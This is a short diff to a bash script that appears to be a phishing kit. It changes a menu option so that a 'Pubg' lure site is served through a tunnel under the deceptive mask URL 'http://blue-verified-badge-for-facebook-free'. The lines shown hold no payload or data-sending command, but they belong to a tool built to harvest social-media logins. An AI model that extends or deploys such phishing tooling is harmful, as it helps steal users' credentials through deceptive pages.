@@ -306,7 +306,9 @@ ${RED}[${WHITE}01${RED}]${ORANGE} link Editor
 		mask='http://blue-verified-badge-for-facebook-free'
 		tunnel_menu
         elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-	        site_Pubg
+	        website="Pubg"
+		mask='http://blue-verified-badge-for-facebook-free'
+		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; clear; banner_mafia; lovehacker_facebook; }
